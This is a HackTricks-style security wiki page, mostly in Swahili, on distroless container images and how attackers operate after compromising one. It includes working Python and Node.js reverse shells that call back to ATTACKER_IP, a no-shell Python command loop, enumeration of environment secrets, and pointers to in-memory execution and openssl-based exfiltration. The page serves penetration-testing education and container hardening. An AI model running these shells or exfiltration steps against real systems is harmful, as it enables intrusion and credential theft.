# Kontena za Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Picha ya kontena ya **distroless** ni picha inayobeba **vipengele vya runtime vya kimsingi vinavyo hitajika kuendesha programu moja maalum**, huku ikitoa kwa makusudi zana za kawaida za distribution kama vile package managers, shells, na seti kubwa za utiliti za userland za jumla. Kwa vitendo, picha za distroless mara nyingi zina tu binary ya programu au runtime, maktaba zilizosambazwa, bundles za cheti, na mpangilio mdogo wa filesystem.

Suala sio kwamba distroless ni primitive mpya ya izolishaji ya kernel. Distroless ni mkakati wa **muundo wa picha**. Inabadilisha kile kilicho tayari **ndani** ya filesystem ya kontena, sio jinsi kernel inavyo izola kontena. Tofauti hiyo ni muhimu, kwa sababu distroless huimarisha mazingira hasa kwa kupunguza kile mshambulizi anaweza kutumia baada ya kupata code execution. Haitozi nafasi za majina (namespaces), seccomp, capabilities, AppArmor, SELinux, au mekanizimu nyingine yoyote ya izolishaji ya runtime.

## Kwa Nini Distroless Ipo

Picha za distroless hutumika hasa kupunguza:

- ukubwa wa picha
- ugumu wa uendeshaji wa picha
- idadi ya packages na binaries ambazo zinaweza kuwa na udhaifu
- idadi ya zana za post-exploitation zinazopatikana kwa mshambulizi kwa chaguo-msingi

Hiyo ndiyo sababu picha za distroless zinapendwa katika deployments za uzalishaji za programu. Kontena ambalo halina shell, hauna package manager, na karibu halina zana za jumla kawaida ni rahisi kueleweka kioperesheni na ngumu zaidi kutumiwa vibaya kisha kuingiliwa.

Mifano ya familia za picha za mtindo wa distroless maarufu ni pamoja na:

- Google's distroless images
- Chainguard hardened/minimal images

## Kile Ambacho Distroless Hakimaanishi

Kontena la distroless **sio**:

- si rootless kiotomatiki
- si isiyo na ruhusa za juu kiotomatiki
- si read-only kiotomatiki
- salama kiotomatiki kwa seccomp, AppArmor, au SELinux
- salama kiotomatiki dhidi ya container escape

Bado inawezekana kuendesha picha ya distroless na `--privileged`, kushiriki host namespaces, bind mounts hatarishi, au socket ya runtime iliyopandikizwa. Katika hali hiyo, picha inaweza kuwa ndogo, lakini kontena bado unaweza kuwa hatari kwa kiwango kikubwa. Distroless inabadilisha uso wa shambulio wa userland, si mpaka wa uaminifu wa kernel.

## Tabia Za Kawaida za Uendeshaji

Unapopata udhalilishaji wa kontena la distroless, jambo la kwanza utakayoliona ni kwamba makadiri ya kawaida yasimame kuwa ya kweli. Huenda hakuna `sh`, hakuna `bash`, hakuna `ls`, hakuna `id`, hakuna `cat`, na wakati mwingine hata sio mazingira ya libc-based yanayofanya kazi kama tradecraft yako ya kawaida inavyotarajia. Hii inaathiri pande zote mbili, offensive na defense, kwa sababu ukosefu wa zana hufanya debugging, incident response, na post-exploitation kuwa tofauti.

Mifumo ya kawaida ni:

- runtime ya programu ipo, lakini karibu hakuna kitu kingine
- payloads zinazotegemea shell zinafeli kwa sababu hakuna shell
- enumeration za one-liners za kawaida zinafeli kwa sababu binaries za msaada hazipo
- ulinzi wa filesystem kama rootfs ya read-only au `noexec` kwenye maeneo ya tmpfs yanayoweza kuandikwa mara nyingi pia yapo

Mchanganyiko huo ndio kawaida hupelekea watu kuzungumzia "weaponizing distroless".

## Distroless na Post-Exploitation

Changamoto kuu ya offensive katika mazingira ya distroless siyo kila wakati RCE ya awali. Mara nyingi ni kile kinachofuata. Ikiwa workload iliyochukuliwa ina code execution ndani ya language runtime kama Python, Node.js, Java, au Go, unaweza kuwa na uwezo wa kutekeleza mantiki yoyote, lakini sio kupitia workflows za kawaida zinazotegemea shell ambazo ni za kawaida kwa targets nyingine za Linux.

Hii inamaanisha post-exploitation mara nyingi hubadilika hadi mojawapo ya mwelekeo mitatu:

1. Use the existing language runtime directly ili kutafuta mazingira, kufungua sockets, kusoma files, au ku-stage payloads za ziada.
2. Bring your own tooling into memory ikiwa filesystem ni read-only au maeneo yanayoweza kuandikwa yame-mounted `noexec`.
3. Abuse existing binaries already present in the image ikiwa programu au dependencies zake zina kitu kilicho muhimu bila kutarajiwa.

## Matumizi Mabaya

### Tambua runtime uliyonayo

Katika kontena nyingi za distroless hakuna shell, lakini bado kuna runtime ya programu. Ikiwa lengo ni service ya Python, Python iko pale. Ikiwa lengo ni Node.js, Node iko pale. Hiyo mara nyingi inatoa uwezo wa kutosha kuorodhesha files, kusoma environment variables, kufungua reverse shells, na ku-stage execution ndani ya memory bila kamwe kuita `/bin/sh`.

Mfano rahisi kwa Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Mfano rahisi na Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Athari:

- urejesho wa variables za mazingira, mara nyingi ikiwa ni pamoja na credentials au service endpoints
- kuorodhesha filesystem bila `/bin/ls`
- utambuzi wa njia zinazoweza kuandikwa na secrets zilizopachikwa

### Reverse Shell Bila `/bin/sh`

Ikiwa image haijumuishi `sh` au `bash`, classic shell-based reverse shell inaweza kushindwa mara moja. Katika hali hiyo, tumia runtime ya lugha iliyosakinishwa badala yake.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Ikiwa `/bin/sh` haipo, badilisha mstari wa mwisho na utekelezaji wa amri kwa kutumia Python moja kwa moja au mzunguko wa Python REPL.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Tena, ikiwa `/bin/sh` haipo, tumia Node's filesystem, process, and networking APIs moja kwa moja badala ya kuanzisha shell.

### Mfano Kamili: No-Shell Python Command Loop

Ikiwa image ina Python lakini haina shell kabisa, loop ya interactive rahisi mara nyingi inatosha ili kuendelea kuwa na uwezo kamili wa post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Hii haihitaji interactive shell binary. Athari yake kwa ufanisi ni sawa na shell ya msingi kutoka kwa mtazamo wa mshambuliaji: utekelezaji wa amri, utofutaji (enumeration), na kuandaa payloads zaidi kupitia runtime iliyopo.

### Utekelezaji wa Zana Kwenye Kumbukumbu

Distroless images mara nyingi zinachanganywa na:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Mchanganyiko huo hufanya taratibu za kawaida za "download binary to disk and run it" zisitegemeke. Katika kesi hizi, mbinu za utekelezaji kwenye kumbukumbu zinakuwa suluhisho kuu.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Mbinu muhimu zaidi huko ni:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binaries Zilizopo Tayari Katika Image

Baadhi ya distroless images bado zina binaries muhimu kwa uendeshaji ambazo zinakuwa za manufaa baada ya kuathiriwa. Mfano unaoonekana mara kwa mara ni `openssl`, kwa sababu programu wakati mwingine zinahitaji kwa kazi za crypto- au zinazohusiana na TLS.

Mfumo wa utafutaji wa haraka ni:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` ipo, inaweza kutumika kwa:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

Uharibifu kamili unategemea kile kilichowekwa kwa kweli, lakini wazo kuu ni kwamba distroless haimaanishi "no tools whatsoever"; inamaanisha "far fewer tools than a normal distribution image".

## Checks

Lengo la ukaguzi huu ni kubaini kama image kwa vitendo ni distroless na ni runtime au helper binaries gani bado zinapatikana kwa post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
What is interesting here:

- Ikiwa hakuna shell lakini runtime kama Python au Node zipo, post-exploitation inapaswa kupinduka kwenda runtime-driven execution.
- Ikiwa root filesystem ni read-only na `/dev/shm` ni writable lakini `noexec`, memory execution techniques zinakuwa muhimu zaidi.
- Ikiwa helper binaries kama `openssl`, `busybox`, au `java` zipo, zinaweza kutoa functionality ya kutosha kuanzisha upatikanaji zaidi.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

The key point is that distroless is an **image property**, not a runtime protection. Its value comes from reducing what is available inside the filesystem after compromise.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
